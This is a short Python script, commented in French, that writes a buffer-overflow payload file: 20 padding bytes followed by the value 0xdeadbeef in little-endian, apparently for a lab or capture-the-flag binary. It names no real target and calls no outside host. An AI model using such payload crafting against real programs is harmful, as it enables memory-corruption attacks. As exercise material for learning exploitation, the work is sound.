#!/usr/bin/env python3
# /tmp/make_payload.py  -- crée /tmp/payload.bin (20 'B' + 0xdeadbeef little-endian)

pad = b'B' * 20
val_bytes = b'\xef\xbe\xad\xde'   # 0xdeadbeef little-endian

payload = pad + val_bytes

with open('/tmp/payload.bin', 'wb') as f:
    f.write(payload)

print("Wrote /tmp/payload.bin  length =", len(payload))
print("Hex payload :", payload.hex())
